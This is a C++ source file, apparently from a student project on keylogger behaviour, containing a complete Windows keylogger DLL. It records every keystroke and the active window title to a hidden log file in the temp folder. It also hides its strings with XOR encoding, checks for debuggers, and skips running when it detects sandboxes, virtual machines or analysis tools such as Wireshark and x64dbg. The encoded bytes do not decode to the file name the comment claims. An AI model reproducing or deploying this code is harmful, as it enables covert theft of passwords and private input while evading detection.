/*
 * keylogger_dll.cpp
 * FMA Project - Behavioural Analysis of a Keylogger
 * 
 * DLL containing the global keyboard hook procedure.
 * Uses SetWindowsHookEx with WH_KEYBOARD_LL for system-wide keystroke capture.
 *
 * Compile (from Kali):
 *   x86_64-w64-mingw32-g++-posix -shared -o build/keylogger_dll.dll src/keylogger_dll.cpp \
 *     -luser32 -static-libgcc -static-libstdc++ -Os -s
 */
#include <windows.h>
#include <tlhelp32.h>
#include <shlobj.h>
#include <fstream>
#include <string>
#include <ctime>

// ========== EVASION: String obfuscation ==========
// XOR-encodes strings at rest to evade static string analysis

std::string xor_str(const std::string& data, char key) {
    std::string result = data;
    for (size_t i = 0; i < data.size(); i++) {
        result[i] = data[i] ^ key;
    }
    return result;
}

// Obfuscated strings (XOR key = 0x5A)
// "keylog.txt"     -> obfuscated
// "\\Microsoft\\Windows\\TaskBars\\" -> obfuscated
const char XORED_LOG_NAME[] = {
    0x32, 0x38, 0x36, 0x3F, 0x3C, 0x3A, 0x05, 0x3D, 0x79, 0x3D, 0x00
};
// Decodes to: "keylog.txt"

// ========== GLOBAL STATE ==========
HHOOK g_hKeyboardHook = NULL;
std::ofstream g_logFile;
bool g_shiftPressed = false;
std::string g_lastWindowTitle = "";
char g_logPath[MAX_PATH] = {0};

// ========== EVASION: Anti-debugging ==========
bool detect_debugger() {
    // Method 1: Windows API
    if (IsDebuggerPresent()) return true;
    
    // Method 2: Check for debugger via NtQueryInformationProcess
    typedef NTSTATUS (NTAPI* pNtQueryInformationProcess)(HANDLE, DWORD, PVOID, ULONG, PULONG);
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll) {
        pNtQueryInformationProcess NtQueryInformationProcess = 
            (pNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
        
        if (NtQueryInformationProcess) {
            BOOL isDebugged = FALSE;
            NTSTATUS status = NtQueryInformationProcess(GetCurrentProcess(), 30, 
                                                         &isDebugged, sizeof(BOOL), NULL);
            if (status == 0 && isDebugged) return true;
        }
    }
    
    return false;
}

// ========== EVASION: Sandbox / VM detection ==========
bool detect_sandbox() {
    // Check screen resolution (sandboxes often use 800x600 or 1024x768)
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    if (w < 1024 || h < 768) return true;
    
    // Check total physical RAM (< 2GB suggests VM/sandbox)
    MEMORYSTATUSEX mem = {0};
    mem.dwLength = sizeof(mem);
    GlobalMemoryStatusEx(&mem);
    if (mem.ullTotalPhys < 2048ULL * 1024 * 1024) return true;
    
    // Check system uptime (< 15 minutes = likely sandbox)
    if (GetTickCount64() < 900000) return true;
    
    // Check for analysis tools in process list
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return false;
    
    const char* suspects[] = {
        "procmon.exe", "procexp.exe", "procmon64.exe", "procexp64.exe",
        "processhacker.exe", "processhacker64.exe",
        "wireshark.exe", "dumpcap.exe",
        "ida.exe", "ida64.exe", "ollydbg.exe", "x64dbg.exe",
        "windbg.exe", "immunitydebugger.exe",
        "vmtoolsd.exe", "vboxservice.exe", "vboxtray.exe",
        "xenservice.exe", "prl_tools.exe"
    };
    
    PROCESSENTRY32W pe = {0};
    pe.dwSize = sizeof(pe);
    
    if (Process32FirstW(hSnap, &pe)) {
        do {
            // Convert to lowercase for comparison
            char exeLower[MAX_PATH];
            int i = 0;
            while (pe.szExeFile[i] && i < MAX_PATH-1) {
                exeLower[i] = (char)tolower(pe.szExeFile[i]);
                i++;
            }
            exeLower[i] = 0;
            
            for (const char* s : suspects) {
                if (strstr(exeLower, s)) {
                    CloseHandle(hSnap);
                    return true;
                }
            }
        } while (Process32NextW(hSnap, &pe));
    }
    
    CloseHandle(hSnap);
    return false;
}

// ========== UTILITY: Get timestamp string ==========
std::string get_timestamp() {
    time_t now = time(0);
    struct tm* timeinfo = localtime(&now);
    char buffer[80];
    strftime(buffer, sizeof(buffer), "%Y-%m-%d %H:%M:%S", timeinfo);
    return std::string(buffer);
}

// ========== UTILITY: Get foreground window title ==========
std::string get_window_title() {
    char title[256] = {0};
    HWND hwnd = GetForegroundWindow();
    if (hwnd) {
        GetWindowTextA(hwnd, title, sizeof(title));
    }
    return std::string(title);
}

// ========== CORE: Log a single keystroke ==========
void log_keystroke(int vkCode, bool keyDown) {
    // Only log on key-down events (avoid duplicate entries)
    if (!keyDown) return;
    
    // Track active window changes
    std::string currentTitle = get_window_title();
    if (currentTitle != g_lastWindowTitle) {
        g_logFile << "\n[" << get_timestamp() << "] [Window: " 
                  << currentTitle << "]\n";
        g_logFile.flush();
        g_lastWindowTitle = currentTitle;
    }
    
    // Handle modifier keys
    if (vkCode == VK_LSHIFT || vkCode == VK_RSHIFT || vkCode == VK_SHIFT) {
        g_shiftPressed = true;
        return;
    }
    if (vkCode == VK_LCONTROL || vkCode == VK_RCONTROL) return;
    if (vkCode == VK_LMENU || vkCode == VK_RMENU) return;
    
    // Build keyboard state for ToAsciiEx
    BYTE keyboardState[256] = {0};
    keyboardState[VK_SHIFT]   = (GetAsyncKeyState(VK_SHIFT)   & 0x8000) ? 0xFF : 0;
    keyboardState[VK_CAPITAL] = (GetKeyState(VK_CAPITAL) & 0x0001) ? 0xFF : 0;
    
    // Convert virtual key code to character
    char buffer[8] = {0};
    UINT scanCode = MapVirtualKeyEx(vkCode, MAPVK_VK_TO_VSC, GetKeyboardLayout(0));
    
    int result = ToAsciiEx(vkCode, scanCode, keyboardState, 
                           (LPWORD)buffer, 0, GetKeyboardLayout(0));
    
    if (result > 0) {
        // Printable character
        g_logFile << buffer;
    } else {
        // Special / non-printable keys
        switch (vkCode) {
            case VK_RETURN: g_logFile << "\n"; break;
            case VK_BACK:   g_logFile << "[BKSP]"; break;
            case VK_TAB:    g_logFile << "[TAB]"; break;
            case VK_ESCAPE: g_logFile << "[ESC]"; break;
            case VK_DELETE: g_logFile << "[DEL]"; break;
            case VK_LEFT:   g_logFile << "[LEFT]"; break;
            case VK_RIGHT:  g_logFile << "[RIGHT]"; break;
            case VK_UP:     g_logFile << "[UP]"; break;
            case VK_DOWN:   g_logFile << "[DOWN]"; break;
            case VK_SPACE:  g_logFile << " "; break;
            case VK_HOME:   g_logFile << "[HOME]"; break;
            case VK_END:    g_logFile << "[END]"; break;
            case VK_PRIOR:  g_logFile << "[PGUP]"; break;
            case VK_NEXT:   g_logFile << "[PGDN]"; break;
            case VK_SNAPSHOT: g_logFile << "[PRTSC]"; break;
            default:
                if (vkCode >= VK_F1 && vkCode <= VK_F12)
                    g_logFile << "[F" << (vkCode - VK_F1 + 1) << "]";
                else if (vkCode >= 0x30 && vkCode <= 0x39)
                    g_logFile << (char)vkCode; // Numbers 0-9 fallback
                else if (vkCode >= 0x41 && vkCode <= 0x5A)
                    g_logFile << (char)vkCode; // Letters A-Z fallback
                else if (vkCode >= VK_NUMPAD0 && vkCode <= VK_NUMPAD9)
                    g_logFile << "[NP" << (vkCode - VK_NUMPAD0) << "]";
                else if (vkCode == VK_MULTIPLY)  g_logFile << "*";
                else if (vkCode == VK_ADD)       g_logFile << "+";
                else if (vkCode == VK_SUBTRACT)  g_logFile << "-";
                else if (vkCode == VK_DECIMAL)   g_logFile << ".";
                else if (vkCode == VK_DIVIDE)    g_logFile << "/";
                break;
        }
    }
    
    g_logFile.flush();
    g_shiftPressed = false;
}

// ========== HOOK CALLBACK ==========
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        KBDLLHOOKSTRUCT* pInfo = (KBDLLHOOKSTRUCT*)lParam;
        bool keyDown = (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN);
        
        // EVASION: Don't log while Ctrl+Shift is held (common analyst pattern)
        if ((GetAsyncKeyState(VK_CONTROL) & 0x8000) && 
            (GetAsyncKeyState(VK_SHIFT) & 0x8000)) {
            return CallNextHookEx(NULL, nCode, wParam, lParam);
        }
        
        log_keystroke(pInfo->vkCode, keyDown);
    }
    
    // CRITICAL: Always call next hook for system stability
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// ========== EXPORTED: Start hook ==========
extern "C" __declspec(dllexport) void StartHook() {
    // EVASION: Check environment before activating
    if (detect_debugger() || detect_sandbox()) {
        // Silent exit - no traces
        return;
    }
    
    // Determine log path: use %TEMP% directory
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    
    // Decode obfuscated log filename
    std::string logName;
    const char* p = XORED_LOG_NAME;
    while (*p) {
        logName += (*p ^ 0x5A);
        p++;
    }
    
    snprintf(g_logPath, sizeof(g_logPath), "%s%s", tempPath, logName.c_str());
    
    // Open log file (append mode)
    g_logFile.open(g_logPath, std::ios::app);
    if (!g_logFile.is_open()) {
        // Fallback to desktop
        char desktopPath[MAX_PATH];
        if (SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktopPath) == S_OK) {
            snprintf(g_logPath, sizeof(g_logPath), "%s\\%s", desktopPath, logName.c_str());
            g_logFile.open(g_logPath, std::ios::app);
        }
    }
    
    if (!g_logFile.is_open()) return;
    
    g_logFile << "\n=== KEYLOGGER STARTED [" << get_timestamp() << "] ===\n";
    g_logFile.flush();
    
    // Install the low-level keyboard hook
    g_hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc,
                                       GetModuleHandle(NULL), 0);
    
    if (g_hKeyboardHook == NULL) {
        g_logFile << "[ERROR] SetWindowsHookEx failed: " << GetLastError() << "\n";
        g_logFile.close();
        return;
    }
    
    g_logFile << "[INFO] Hook installed successfully\n";
    g_logFile.flush();
    
    // Message loop - required for the hook to receive events
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
}

// ========== EXPORTED: Stop hook ==========
extern "C" __declspec(dllexport) void StopHook() {
    if (g_hKeyboardHook) {
        UnhookWindowsHookEx(g_hKeyboardHook);
        g_hKeyboardHook = NULL;
    }
    if (g_logFile.is_open()) {
        g_logFile << "=== KEYLOGGER STOPPED [" << get_timestamp() << "] ===\n";
        g_logFile.close();
    }
}

// ========== DLL ENTRY POINT ==========
BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    switch (reason) {
        case DLL_PROCESS_ATTACH:
            // Don't call DllMain for thread attach/detach
            DisableThreadLibraryCalls(hModule);
            break;
        case DLL_PROCESS_DETACH:
            StopHook();
            break;
    }
    return TRUE;
}
